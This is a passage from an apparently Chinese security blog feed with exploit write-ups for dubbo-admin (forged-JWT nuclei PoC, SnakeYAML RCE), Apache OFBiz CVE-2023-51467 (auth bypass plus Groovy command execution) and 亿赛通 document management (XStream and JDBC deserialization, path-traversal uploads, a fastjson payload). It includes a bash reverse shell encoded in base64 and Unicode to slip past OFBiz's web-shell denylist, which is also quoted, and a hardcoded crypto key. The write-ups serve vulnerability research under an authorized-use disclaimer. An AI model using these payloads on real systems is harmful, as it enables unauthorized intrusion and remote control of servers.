class="hljs-attr">id:</span> <span class="hljs-string">dubbo-admin_Unauthorized_bypass</span><br><span class="hljs-attr">info:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">Template</span> <span class="hljs-string">Name</span><br>  <span class="hljs-attr">author:</span> <br>  <span class="hljs-attr">severity:</span> <span class="hljs-string">medium</span><br>  <span class="hljs-attr">description:</span> <span class="hljs-string">dubbo-admin</span> <span class="hljs-string">Unauthorized</span> <span class="hljs-string">access</span> <span class="hljs-string">bypass</span><br>  <span class="hljs-attr">reference:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://</span><br>  <span class="hljs-attr">tags:</span> <span class="hljs-string">apache,dubbo-admin</span><br><span class="hljs-attr">requests:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">raw:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">|+</span><br><span class="hljs-string">        GET /api/dev/consumers HTTP/1.1</span><br><span class="hljs-string">        Host: &#123;&#123;Hostname&#125;&#125;</span><br><span class="hljs-string">        Accept: application/json, text/plain, */*</span><br><span class="hljs-string">        Authorization: eyJhbGciOiJIUzUxMiJ9.eyJleHAiOjk5OTk5OTk5OTksInN1YiI6InJvb3QiLCJpYXQiOjE2OTkwODM2Mzd9.wKRqJkWxr_nVDcVVF5rniqhnACtqaDnYUUu55g-atkIwRIt1A-SMpKqBN5zrGZl4kFVcrjzMvXsYqfqf0N9Gbg</span><br><span class="hljs-string">        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36</span><br><span class="hljs-string">        Referer: http://&#123;&#123;Hostname&#125;&#125;/</span><br><span class="hljs-string">        Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">        Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">        Connection: close</span><br><span class="hljs-string"></span><br>    <span class="hljs-attr">matchers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">word</span><br>        <span class="hljs-attr">part:</span> <span class="hljs-string">header</span><br>        <span class="hljs-attr">words:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;HTTP/1.1 200 &#x27;</span><br><br></code></pre></td></tr></table></figure><p>A poc of nuclei. You can quickly verify permission bypass.</p><h2 id="0x03-尝试找r点"><a href="#0x03-尝试找r点" class="headerlink" title="0x03 尝试找r点"></a>0x03 尝试找r点</h2><p><img src="image-20231106195354794.png" alt="image-20231106195354794"></p><p>pom里面有snakeyaml。</p><p>自然想到yaml.load()。</p><p>org&#x2F;apache&#x2F;dubbo&#x2F;admin&#x2F;common&#x2F;util&#x2F;YamlParser.java</p><p><img src="image-20231106195602958.png" alt="image-20231106195602958"></p><p>最后找到这两个，可控的地方。</p><p>我门跟一下下面的</p><p>org&#x2F;apache&#x2F;dubbo&#x2F;admin&#x2F;service&#x2F;impl&#x2F;MeshRouteServiceImpl.java</p><p><img src="image-20231106195729394.png" alt="image-20231106195729394"></p><p>可以看到是检查mesh的规则。</p><p><img src="image-20231106195807880.png" alt="image-20231106195807880"></p><p>找一下调用，发现在创建规则和更新时都会触发。</p><p>org&#x2F;apache&#x2F;dubbo&#x2F;admin&#x2F;controller&#x2F;MeshRouteController.java</p><p><img src="image-20231106200004806.png" alt="image-20231106200004806"></p><p><img src="image-20231106200043446.png" alt="image-20231106200043446"></p><p>最后也是找到路由点。</p><p>接下来测试一下</p><p><img src="image-20231106201002652.png" alt="image-20231106201002652"></p><p>随便输入，然后替换为伪造的jwt</p><p><img src="image-20231106201127532.png" alt="image-20231106201127532"></p><p><img src="image-20231106201325511.png" alt="image-20231106201325511"></p><p>是能成功登入的</p><p>来到msh路由</p><p><img src="image-20231106201410048.png" alt="image-20231106201410048"></p><p><img src="image-20231106201624404.png" alt="image-20231106201624404"></p><p><img src="image-20231106201718869.png" alt="image-20231106201718869"></p><p><img src="image-20231106201800526.png" alt="image-20231106201800526"></p><p>跟进一下，发现SafeConstructor()开启了白名单。G.</p><p><img src="image-20231106202141390.png" alt="image-20231106202141390"></p><p>手动改了后，重新尝试。</p><p><img src="image-20231106202341361.png" alt="image-20231106202341361"></p><p><img src="image-20231106202403421.png" alt="image-20231106202403421"></p><p>可以成功执行。</p><p><img src="image-20231106202532708.png" alt="image-20231106202532708"></p><p>查看了一下版本 0.3开始SafeConstructor()，</p><p><img src="image-20231106202618841.png" alt="image-20231106202618841"></p><p>0.2看来可以的。</p><p><img src="image-20231106202833829.png" alt="image-20231106202833829"></p><p>单jwt机制在0.4引用。鸡肋。</p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ofbiz-CVE-2023-51467</title>
    <link href="/2024/01/09/ofbiz-CVE-2023-51467/"/>
    <url>/2024/01/09/ofbiz-CVE-2023-51467/</url>
    
    <content type="html"><![CDATA[<h2 id="ofbiz-CVE-2023-51467"><a href="#ofbiz-CVE-2023-51467" class="headerlink" title="ofbiz-CVE-2023-51467"></a>ofbiz-CVE-2023-51467</h2><h3 id="0x01-漏洞介绍"><a href="#0x01-漏洞介绍" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h3><p>​ofbiz-18.12.10及以前，鉴权绕过使用<code>execute()</code>方法执行外部命令。</p><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-string">&quot;calc&quot;</span>.execute()<br></code></pre></td></tr></table></figure><p>代码没有对Groovy脚本，<code>execute()</code>方法进行过滤。</p><p>最新版修了鉴权绕过，命令执行没有修复。</p><h3 id="0x02-命令过滤"><a href="#0x02-命令过滤" class="headerlink" title="0x02 命令过滤"></a>0x02 命令过滤</h3><p>在路径framework&#x2F;security&#x2F;config&#x2F;security.properties 里面存在命令黑名单。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">deniedWebShellTokens=java.,beans,freemarker,&lt;script,javascript,&lt;body,body ,&lt;form,&lt;jsp:,&lt;c:out,taglib,&lt;prefix,&lt;%@ page,<span class="hljs-meta">&lt;?php,exec(,alert(,\</span><br><span class="hljs-meta">                     %eval,@eval,eval(,runtime,import,passthru,shell_exec,assert,str_rot13,system,decode,include,page ,\</span><br><span class="hljs-meta">                     chmod,mkdir,fopen,fclose,new file,upload,getfilename,download,getoutputstring,readfile,iframe,object,embed,onload,build,\</span><br><span class="hljs-meta">                     python,perl ,/perl,ruby ,/ruby,process,function,class,InputStream,to_server,wget ,static,assign,webappPath,\</span><br><span class="hljs-meta">                     ifconfig,route,crontab,netstat,uname ,hostname,iptables,whoami,&quot;cmd&quot;,*cmd|,+cmd|,=cmd|,localhost,thread,require,gzdeflate</span><br></code></pre></td></tr></table></figure><p>限制也不多，也可以直接使用unicode编码就可以绕过。</p><h3 id="0X03-Groovy分析"><a href="#0X03-Groovy分析" class="headerlink" title="0X03  Groovy分析"></a>0X03  Groovy分析</h3><p>apache-ofbiz-18.12.11&#x2F;framework&#x2F;webtools&#x2F;webapp&#x2F;webtools&#x2F;WEB-INF&#x2F;controller.xml </p><p>412-416行</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">request-map</span> <span class="hljs-attr">uri</span>=<span class="hljs-string">&quot;ProgramExport&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">security</span> <span class="hljs-attr">https</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">auth</span>=<span class="hljs-string">&quot;true&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">response</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;view&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;ProgramExport&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">response</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;error&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;view&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;ProgramExport&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">request-map</span>&gt;</span><br></code></pre></td></tr></table></figure><p>可以看到是view类型</p><p>652行写着对应配置位置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">view-map</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ProgramExport&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;screen&quot;</span> <span class="hljs-attr">page</span>=<span class="hljs-string">&quot;component://webtools/widget/EntityScreens.xml#ProgramExport&quot;</span>/&gt;</span><br><br></code></pre></td></tr></table></figure><p>apache-ofbiz-18.12.11&#x2F;framework&#x2F;webtools&#x2F;widget&#x2F;EntityScreens.xml</p><p>74-96行</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">screen</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ProgramExport&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">section</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">actions</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">set</span> <span class="hljs-attr">field</span>=<span class="hljs-string">&quot;titleProperty&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;PageTitleEntityExportAll&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">set</span> <span class="hljs-attr">field</span>=<span class="hljs-string">&quot;tabButtonItem&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;programExport&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;component://webtools/groovyScripts/entity/ProgramExport.groovy&quot;</span>/&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-handlebars">        <span class="hljs-tag">&lt;/<span class="hljs-name">actions</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">        <span class="hljs-tag">&lt;<span class="hljs-name">widgets</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">            <span class="hljs-tag">&lt;<span class="hljs-name">decorator-screen</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;CommonImportExportDecorator&quot;</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;$&#123;parameters.mainDecoratorLocation&#125;&quot;</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                <span class="hljs-tag">&lt;<span class="hljs-name">decorator-section</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;body&quot;</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                     <span class="hljs-tag">&lt;<span class="hljs-name">screenlet</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                        <span class="hljs-tag">&lt;<span class="hljs-name">include-form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ProgramExport&quot;</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;component://webtools/widget/MiscForms.xml&quot;</span>/&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                    <span class="hljs-tag">&lt;/<span class="hljs-name">screenlet</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                    <span class="hljs-tag">&lt;<span class="hljs-name">screenlet</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                        <span class="hljs-tag">&lt;<span class="hljs-name">platform-specific</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                            <span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html-template</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;component://webtools/template/entity/ProgramExport.ftl&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                        <span class="hljs-tag">&lt;/<span class="hljs-name">platform-specific</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                    <span class="hljs-tag">&lt;/<span class="hljs-name">screenlet</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                <span class="hljs-tag">&lt;/<span class="hljs-name">decorator-section</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">            <span class="hljs-tag">&lt;/<span class="hljs-name">decorator-screen</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">        <span class="hljs-tag">&lt;/<span class="hljs-name">widgets</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">    <span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;/<span class="hljs-name">screen</span>&gt;</span></span></span><br></code></pre></td></tr></table></figure><p>可以看见调用了</p><p> &#x2F;webtools&#x2F;groovyScripts&#x2F;entity&#x2F;ProgramExport.groovy</p><p>56-73行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java">    parameters.groovyProgram = groovyProgram<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    groovyProgram = parameters.groovyProgram<br>&#125;<br><br><span class="hljs-comment">// Add imports for script.</span><br><span class="hljs-type">def</span> <span class="hljs-variable">importCustomizer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ImportCustomizer</span>()<br>importCustomizer.addImport(<span class="hljs-string">&quot;org.apache.ofbiz.entity.GenericValue&quot;</span>)<br>importCustomizer.addImport(<span class="hljs-string">&quot;org.apache.ofbiz.entity.model.ModelEntity&quot;</span>)<br><span class="hljs-type">def</span> <span class="hljs-variable">configuration</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CompilerConfiguration</span>()<br>configuration.addCompilationCustomizers(importCustomizer)<br><br><span class="hljs-type">Binding</span> <span class="hljs-variable">binding</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Binding</span>()<br>binding.setVariable(<span class="hljs-string">&quot;delegator&quot;</span>, delegator)<br>binding.setVariable(<span class="hljs-string">&quot;recordValues&quot;</span>, recordValues)<br><br><span class="hljs-type">ClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader()<br><span class="hljs-type">def</span> <span class="hljs-variable">shell</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GroovyShell</span>(loader, binding, configuration)<br></code></pre></td></tr></table></figure><p>从groovyProgram获取参数然后执行。</p><p>org&#x2F;apache&#x2F;ofbiz&#x2F;base&#x2F;util&#x2F;GroovyUtil.java</p><p><img src="image-20240102025028710.png" alt="image-20240102025028710"></p><p>这个回去去上面的配置，然后执行。</p><h3 id="0x04-鉴权绕过分析"><a href="#0x04-鉴权绕过分析" class="headerlink" title="0x04 鉴权绕过分析"></a>0x04 鉴权绕过分析</h3><p>org&#x2F;apache&#x2F;ofbiz&#x2F;webapp&#x2F;control&#x2F;LoginWorker.java#checkLogin</p><p><img src="image-20240109173229165.png" alt="image-20240109173229165"></p><p><img src="image-20240109173248165.png" alt="image-20240109173248165"></p><p>就是不满足if就可以返回success。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (username == <span class="hljs-literal">null</span><br>        || (password == <span class="hljs-literal">null</span> &amp;&amp; token == <span class="hljs-literal">null</span>)<br>        || <span class="hljs-string">&quot;error&quot;</span>.equals(login(request, response)))<br></code></pre></td></tr></table></figure><p><img src="image-20240109173337709.png" alt="image-20240109173337709"></p><p>username，password，token可控，可以构造。</p><p>看login(request, response)就行</p><p>java&#x2F;org&#x2F;apache&#x2F;ofbiz&#x2F;webapp&#x2F;control&#x2F;LoginWorker.java#login()</p><p><img src="image-20240109173652511.png" alt="image-20240109173652511"></p><p>判断username，password，token是否为null，不为null就是赋予值。</p><p>然后判断非空，不为空就赋予值</p><p>然后username，password，token非否为空,为空就在数组unpwErrMsgList加入数据。</p><p><img src="image-20240109174050423.png" alt="image-20240109174050423"></p><p>最重要的就是这里。</p><p>unpwErrMsgList只要不为空就进入if。然后requirePasswordChange可控，传入Y就可以返回suceess。</p><p><img src="image-20240109174308632.png" alt="image-20240109174308632"></p><p>然后不满足”error”.equals(login(request, response))，最后返回checkLogin()函数返回success，绕过鉴权。</p><p>最后构造poc。不赋值获取到的是””，不是NULL，””不等于NULL,为false，但使用isNotEmpty()判断时是true。</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts">USERNAME=<span class="hljs-variable">&amp;</span>PASSWORD=<span class="hljs-variable">&amp;</span>TOKEN=<span class="hljs-variable">&amp;</span>requirePasswordC<span class="hljs-attr">hange</span><span class="hljs-operator">=</span>y<br></code></pre></td></tr></table></figure><h3 id="0x05-复现"><a href="#0x05-复现" class="headerlink" title="0x05  复现"></a>0x05  复现</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-string">&quot;$&#123;&#x27;your command&#x27;.execute()&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>对open -a calculator</p><p><img src="image-20240102021202674.png" alt="image-20240102021202674"></p><p>对Reverse Shell进行unicode编码进行测试。</p><p>先对Reverse Shell转换成java可以识别的形式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">/bin/bash -i &gt;&amp; /dev/tcp/127.0.0.1/8888 0&gt;&amp;1<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">bash -c &#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;<br></code></pre></td></tr></table></figure><p>在使用unicode编码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">\u0062\u0061\u0073\u0068\u0020\u002D\u0063\u0020\u007B\u0065\u0063\u0068\u006F\u002C\u004C\u0032\u004A\u0070\u0062\u0069\u0039\u0069\u0059\u0058\u004E\u006F\u0049\u0043\u0031\u0070\u0049\u0044\u0034\u006D\u0049\u0043\u0039\u006B\u005A\u0058\u0059\u0076\u0064\u0047\u004E\u0077\u004C\u007A\u0045\u0079\u004E\u0079\u0034\u0077\u004C\u006A\u0041\u0075\u004D\u0053\u0038\u0034\u004F\u0044\u0067\u0034\u0049\u0044\u0041\u002B\u004A\u006A\u0045\u003D\u007D\u007C\u007B\u0062\u0061\u0073\u0065\u0036\u0034\u002C\u002D\u0064\u007D\u007C\u007B\u0062\u0061\u0073\u0068\u002C\u002D\u0069\u007D<br></code></pre></td></tr></table></figure><p>成功获取shell</p><p><img src="image-20240102020946197.png" alt="image-20240102020946197"></p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>亿赛通电子文档代码审计</title>
    <link href="/2023/12/22/%E4%BA%BF%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2023/12/22/%E4%BA%BF%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>​亿赛通电子文档安全管理系统最近很火热，趁热分析一波。</p><h2 id="0x02-（1day）jdbc反序列化"><a href="#0x02-（1day）jdbc反序列化" class="headerlink" title="0x02  （1day）jdbc反序列化"></a>0x02  （1day）jdbc反序列化</h2><p>没什么用，安装包没有mysql依赖。</p><p><img src="image-20231222174021402.png" alt="image-20231222174021402"></p><p><img src="image-20231222174046008.png" alt="image-20231222174046008"></p><p>路由 &#x2F;CDGServer3&#x2F;LdapAjax</p><p>对应com.esafenet.servlet.ajax.DBAjax</p><p><img src="image-20231220093540537.png" alt="image-20231220093540537"></p><p>doPost接受传参command，若果等于testConnection就调用testConnection方法。</p><p><img src="image-20231222121135375.png" alt="image-20231222121135375"></p><p>testConnection会获取数据库账号密码，ip，configvalues，然后判断使用什么数据库，然后调用connection方法。</p><p><img src="image-20231220094157288.png" alt="image-20231220094157288"></p><p>然后就是反射获取服务，链接。全都可以控制，很容易就想起jdbc。</p><p>webapps&#x2F;CDGServer3&#x2F;config&#x2F;DBConfig.jsp</p><p>jsp里面有对应传输的格式。</p><p><img src="image-20231220094540250.png" alt="image-20231220094540250"></p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p><img src="image-20231220095830915.png" alt="image-20231220095830915"></p><h2 id="0x02-1day？nday-xstreem反序列化"><a href="#0x02-1day？nday-xstreem反序列化" class="headerlink" title="0x02 (1day？nday)xstreem反序列化"></a>0x02 (1day？nday)xstreem反序列化</h2><p>查看lib，发现存在低版本的xstream的环境包，很自然就可以想到xstream低版本反序列化漏洞。</p><p><img src="image-20231221170223093.png" alt="image-20231221170223093"></p><p>所以只需要找到一个servlet的里面调用了fromXML就可以了。</p><p>所以我们找servlet里面的service方法，看谁调用了fromXML方法就可以了.</p><p>由于触发点很多，我们希望只在service里面就找到触发点。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">MATCH  (m1:Method &#123;NAME: <span class="hljs-string">&quot;service&quot;</span>&#125;) WHERE m1.CLASSNAME =~ <span class="hljs-string">&quot;com.esafenet.servlet.service.*&quot;</span><br><span class="hljs-type">MATCH</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> (m1)-[:CALL]-(m2:Method &#123;NAME:<span class="hljs-string">&quot;fromXML&quot;</span>&#125;) <br>RETURN path<br></code></pre></td></tr></table></figure><p><img src="image-20231222115957326.png" alt="image-20231222115957326"></p><p>这样我们就得到只调用一次就出发漏洞。可以看到很多点。</p><p>找其中一个路由 &#x2F;CDGServer3&#x2F;UserLoginOutService1</p><p><img src="image-20231222203249063.png" alt="image-20231222203249063"></p><p>在web.xml找对应的可以进行分析<img src="image-20231222120846744.png" alt="image-20231222120846744"></p><p>对应 com.esafenet.servlet.service.UserLoginOutService1</p><p><img src="../../../../CDGServer3/image-20231220110956649.png" alt="image-20231220110956649"></p><p>从request获取，然后fromXML。</p><p>所有重点就是看ServiceUtil.getXMLFromRequest(), 怎么处理。</p><p><img src="image-20231220111054322.png" alt="image-20231220111054322"></p><p><img src="image-20231220111148015.png" alt="image-20231220111148015"></p><p>它会先getXMLFromRequest0获取流转化string，然后调用decodeString解密。</p><p><img src="image-20231220111230823.png" alt="image-20231220111230823"></p><p>对应的解密算法。</p><p><img src="image-20231220111247987.png" alt="image-20231220111247987"></p><p>密钥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] abyte0 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;-<span class="hljs-number">21</span>, -<span class="hljs-number">112</span>, <span class="hljs-number">90</span>, -<span class="hljs-number">68</span>, <span class="hljs-number">5</span>, <span class="hljs-number">44</span>, <span class="hljs-number">85</span>, -<span class="hljs-number">86</span>, -<span class="hljs-number">21</span>, -<span class="hljs-number">112</span>, <span class="hljs-number">90</span>, -<span class="hljs-number">68</span>, <span class="hljs-number">5</span>, <span class="hljs-number">44</span>, <span class="hljs-number">85</span>, -<span class="hljs-number">86</span>&#125;;<br><br></code></pre></td></tr></table></figure><p>所以找对应的加密算法就可以。</p><p><img src="image-20231220111407884.png" alt="image-20231220111407884"></p><p>对应的加密算法。剩下就是xstreem的漏洞流程。</p><h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p><img src="image-20231220113409891.png" alt="image-20231220113409891"></p><p><img src="image-20231220113437458.png" alt="image-20231220113437458"></p><h2 id="0x03-（nday）文件上传-1"><a href="#0x03-（nday）文件上传-1" class="headerlink" title="0x03 （nday）文件上传 -1"></a>0x03 （nday）文件上传 -1</h2><h3 id="DecryptApplicationService2-uoload"><a href="#DecryptApplicationService2-uoload" class="headerlink" title="DecryptApplicationService2_uoload"></a>DecryptApplicationService2_uoload</h3><p>com.esafenet.servlet.service.smartsec.DecryptApplicationService2</p><p><img src="image-20231222174545123.png" alt="image-20231222174545123"></p><p><img src="image-20231222174629936.png" alt="image-20231222174629936"></p><p>没什么好分析的，从获取fileId然后拼接路径，获取iStream直接写入。</p><p>fileId没有过滤，可以目录穿越写入导致rce.</p><h2 id="0x04（nday）文件上传-2"><a href="#0x04（nday）文件上传-2" class="headerlink" title="0x04（nday）文件上传 -2"></a>0x04（nday）文件上传 -2</h2><h3 id="UploadFileFromClientServiceForClient-upload"><a href="#UploadFileFromClientServiceForClient-upload" class="headerlink" title="UploadFileFromClientServiceForClient_upload"></a>UploadFileFromClientServiceForClient_upload</h3><p><img src="image-20231222175051914.png" alt="image-20231222175051914"></p><p><img src="image-20231222175126611.png" alt="image-20231222175126611"></p><p>解密value_code</p><p><img src="image-20231222175227500.png" alt="image-20231222175227500"></p><p>在下面进行判断</p><p><img src="image-20231222175404289.png" alt="image-20231222175404289"></p><p>然后可控fileName, InputStream从req获取，最后写入，同理目录穿越写入。</p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p><img src="image-20231222175836126.png" alt="image-20231222175836126"></p><h2 id="0x05-fastjson"><a href="#0x05-fastjson" class="headerlink" title="0x05 fastjson"></a>0x05 fastjson</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/dataflowconf/</span>saveConfig.<span class="hljs-keyword">do</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.esafenet</span><span class="hljs-selector-class">.ta</span><span class="hljs-selector-class">.dataconf</span><span class="hljs-selector-class">.controller</span>.saveConfig<br></code></pre></td></tr></table></figure><p><img src="image-20231227004844929.png" alt="image-20231227004844929"></p><p><img src="image-20231227004959240.png" alt="image-20231227004959240"></p><p><img src="image-20231227005043898.png" alt="image-20231227005043898"></p><p>我是大彩笔</p><h3 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h3><p>直接使用1.2.47的payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;e&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span 